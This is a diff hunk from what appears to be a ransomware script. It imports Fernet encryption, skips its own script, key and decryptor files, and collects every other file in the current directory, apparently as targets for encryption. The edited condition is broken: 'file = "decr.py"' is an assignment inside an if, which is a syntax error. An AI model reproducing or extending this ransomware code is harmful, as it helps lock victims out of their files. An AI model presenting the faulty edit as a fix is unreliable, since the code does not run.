@@ -3,7 +3,7 @@ from cryptography.fernet import Fernet # type: ignore
 
 allfiles = []
 for file in os.listdir():
-    if file == "ransomware.py" or file == "key.key" or "decr.py":
+    if file == "ransomware.py" or file == "key.key" or file = "decr.py":
         continue
     if os.path.isfile(file):
         allfiles.append(file)
